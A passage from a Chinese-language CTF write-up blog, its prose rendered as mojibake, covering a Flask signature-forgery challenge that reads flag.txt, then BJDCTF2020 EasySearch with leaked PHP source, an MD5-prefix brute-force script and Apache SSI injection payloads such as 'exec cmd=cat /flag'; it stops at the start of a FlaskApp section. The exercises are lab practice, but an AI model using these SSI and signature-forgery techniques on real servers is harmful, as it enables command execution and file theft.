</span></span><span class="line"><span class="cl">                <span class="n">tmpfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./</span><span class="si">%s</span><span class="s2">/result.txt&#34;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>   <span class="c1">#æ³¨æ„wï¼Œå¯ä»¥å¯¹result.txtæ–‡ä»¶è¿›è¡Œä¿®æ”¹</span>
</span></span><span class="line"><span class="cl">                <span class="n">resp</span> <span class="o">=</span> <span class="n">scan</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">resp</span> <span class="o">==</span> <span class="s2">&#34;Connection Timeout&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">                    <span class="n">tmpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>	<span class="c1">#è¿™ä¸ªå°†respä¸­çš„æ•°æ®å†™å…¥result.txtä¸­ï¼Œå¯ä»¥åˆ©ç”¨ä¸ºå°†flag.txtä¸­çš„æ•°æ®æ”¾è¿›result.txtä¸­</span>
</span></span><span class="line"><span class="cl">                    <span class="n">tmpfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;read&#34;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./</span><span class="si">%s</span><span class="s2">/result.txt&#34;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>	<span class="c1">#æ‰“å¼€æ–¹å¼ä¸ºåªè¯»</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>	<span class="c1">#è¯»å–result.txtä¸­çš„æ•°æ®</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;Action Error&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;Sign Error&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">checkSign</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">getSign</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">sign</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/geneSign&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">geneSign</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;param&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="s2">&#34;scan&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/De1ta&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>		<span class="c1">#æ³¨æ„è¿™ä¸ªç»‘å®šï¼Œæ¥ä¸‹æ¥çš„å‡ ä¸ªå‡½æ•°éƒ½å¾ˆé‡è¦ï¼Œè¿™ä¸ªç›¸å½“äºcè¯­è¨€é‡Œé¢çš„ä¸»å‡½æ•°ï¼Œæ¥ä¸‹æ¥æ˜¯è°ƒç”¨å…¶ä»–å‡½æ•°çš„è¿‡ç¨‹</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">challenge</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;action&#34;</span><span class="p">))</span>		<span class="c1">#cookieä¼ é€’actionå‚æ•°ï¼Œå¯¹åº”ä¸åŒçš„å¤„ç†æ–¹å¼</span>
</span></span><span class="line"><span class="cl">    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;param&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>		<span class="c1">#ä¼ é€’getæ–¹å¼çš„å‚æ•°param</span>
</span></span><span class="line"><span class="cl">    <span class="n">sign</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;sign&#34;</span><span class="p">))</span>			<span class="c1">#cookieä¼ é€’signå‚æ•°sign</span>
</span></span><span class="line"><span class="cl">    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>				<span class="c1">#è·å–è¯·æ±‚ç«¯çš„ipåœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">waf</span><span class="p">(</span><span class="n">param</span><span class="p">)):</span>			<span class="c1">#è°ƒç”¨wafå‡½æ•°è¿›è¡Œè¿‡æ»¤</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;No Hacker!!!!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">task</span> <span class="o">=</span> <span class="n">Task</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span> 			<span class="c1">#åˆ›å»ºTaskç±»å¯¹è±¡</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">task</span><span class="o">.</span><span class="n">Exec</span><span class="p">())</span>			<span class="c1">#ä»¥jsonçš„å½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;code.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">socket</span><span class="o">.</span><span class="n">setdefaulttimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">param</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">50</span><span class="p">]</span>		<span class="c1">#è¿™ä¸ªå¯ä»¥åˆ©ç”¨ä¸ºè®¿é—®flag.txtã€‚è¯»å–ç„¶åä¸ºä¸‹ä¸€æ­¥å°†flag.txtæ–‡ä»¶ä¸­çš„ä¸œè¥¿æ”¾åˆ°result.txtä¸­åšé“ºå«</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Connection Timeout&#34;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>				<span class="c1">#getSignçš„ä½œç”¨æ˜¯æ‹¼æ¥secret_key,param,actionï¼Œç„¶åè¿”å›æ‹¼æ¥åçš„å­—ç¬¦ä¸²çš„md5åŠ å¯†å€¼</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">secert_key</span> <span class="o">+</span> <span class="n">param</span> <span class="o">+</span> <span class="n">action</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>			<span class="c1">#å°†ä¼ å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œmd5åŠ å¯†</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>						<span class="c1">#é˜²ç«å¢™çš„ä½œç”¨æ˜¯åˆ¤æ–­å¼€å¤´çš„å‡ ä¸ªå­—æ¯æ˜¯å¦æ˜¯gopher æˆ–è€…æ˜¯file  å¦‚æœæ˜¯çš„è¯ï¼Œè¿”å›true</span>
</span></span><span class="line"><span class="cl">    <span class="n">check</span><span class="o">=</span><span class="n">param</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;gopher&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">9999</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>/geneSignè·¯ç”±ä¸‹é¢ä¼šè°ƒç”¨getsignå‡½æ•°ï¼Œè·Ÿè¿›ä¼šæœ‰MD5å“ˆå¸Œï¼Œ<code> return hashlib.md5(secert_key + param + action).hexdigest()</code>,æˆ‘ä»¬ä¼ å…¥flag.txtreadå°±ä¼šè¢«æ‹¼æ¥ä¸ºsecert_key+flag.txt+read+scan,ç„¶åå°±æ»¡è¶³ä¸‹é¢å°†flag.txtå†™å…¥result.txtï¼Œç„¶åå†è¯»å–result.txtï¼Œ/geneSignè·¯ç”±ä¼šå›æ˜¾hash,ç„¶åæˆ‘ä»¬åœ¨/De1taè·¯ç”±ä¸‹é¢çš„cookieä¼ å…¥ç¬¦åˆæ¡ä»¶çš„å€¼ï¼Œå°±èƒ½è¯»å–result.txt</p>
<p>hash:<code>0ffa43c8b41c61f35e5f10c15ee8a3e6</code></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250220143443002.png"
	width="1741"
	height="627"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250220143443002_hu1718320917810758838.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250220143443002_hu4882630927367451912.png 1024w"
	loading="lazy"
	
		alt="image-20250220143443002"
	
	
		class="gallery-image" 
		data-flex-grow="277"
		data-flex-basis="666px"
	
></p>
<h2 id="bjdctf2020easysearch">[BJDCTF2020]EasySearch
</h2><p>ç›®å½•æ‰«ææ‰«å‡ºindex.php.swp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">	<span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">get_hash</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$random</span> <span class="o">=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)];</span><span class="c1">//Random 5 times
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$content</span> <span class="o">=</span> <span class="nx">uniqid</span><span class="p">()</span><span class="o">.</span><span class="nv">$random</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: text/html;charset=utf-8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$admin</span> <span class="o">=</span> <span class="s1">&#39;6d0bc1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$admin</span> <span class="o">==</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]),</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_shtml</span> <span class="o">=</span> <span class="s2">&#34;public/&#34;</span><span class="o">.</span><span class="nx">get_hash</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;.shtml&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shtml</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$file_shtml</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$text</span> <span class="o">=</span> <span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1&gt;Hello,&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">			***&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">,</span><span class="nv">$text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fclose</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">***</span>
</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s2">&#34;[!] Header  error ...&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>passwordçš„md5hashè¦æ˜¯6d0bc1,å†™è„šæœ¬çˆ†ç ´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">=</span><span class="s1">&#39;0123456789&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">BF</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">left</span><span class="p">,</span><span class="n">right</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">left</span><span class="o">=</span><span class="n">left</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">right</span><span class="o">=</span><span class="n">right</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">admin</span><span class="o">=</span><span class="s1">&#39;6d0bc1&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">left</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">right</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">s</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">==</span><span class="n">admin</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">threads</span><span class="o">=</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">thread_count</span><span class="o">=</span><span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">thread_count</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">BF</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">2000000</span><span class="p">,(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2000000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2020666
2305004
9162671</p>
<p>ç™»å…¥æˆåŠŸåä¼šåœ¨publicè·¯ç”±ä¸‹é¢å†™å…¥shtmlæ–‡ä»¶</p>
<p>æ¥ä¸‹æ¥å°±ç”¨åˆ°</p>
<h3 id="apache-ssi-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ssiæ³¨å…¥æ¼æ´">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆSSIæ³¨å…¥æ¼æ´ï¼‰
</h3><p>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtmlï¼Œåˆ©ç”¨<code>&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</code>è¯­æ³•æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ä½¿ç”¨SSI(Server Side Include)çš„htmlæ–‡ä»¶æ‰©å±•åï¼ŒSSIï¼ˆServer Side Include)ï¼Œé€šå¸¸ç§°ä¸º&quot;æœåŠ¡å™¨ç«¯åµŒå…¥&quot;æˆ–è€…å«&quot;æœåŠ¡å™¨ç«¯åŒ…å«&quot;ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºASPçš„åŸºäºæœåŠ¡å™¨çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚é»˜è®¤æ‰©å±•åæ˜¯ .stmã€.shtm å’Œ .shtmlã€‚</p>
<p>æˆ‘ä»¬å…ˆbpæŸ¥çœ‹ä¿¡æ¯ï¼Œæ‰¾åˆ°å‰ä¸‹çš„shtmlï¼Œå›æ˜¾ç”¨æˆ·å</p>
<p>å¯ä»¥åœ¨ç”¨æˆ·åå¤„æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!--#exec cmd=&#34;ls ../&#34; --&gt;
</span></span><span class="line"><span class="cl">&lt;!--#exec cmd=&#34;cat /flag&#34; --&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæ‰¾åˆ°flag_990c66bf85a09c664f0b6741840499b2</p>
<h2 id="gyctf2020flaskapp">[GYCTF2020]FlaskApp
</h2><p>å…ˆç”¨éé¢„æœŸè§£</p>
<p>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ï¼Œæˆ–è€…å€’åºè¾“å‡ºç»•è¿‡</p>
<div class="highlight"><div class="chroma">
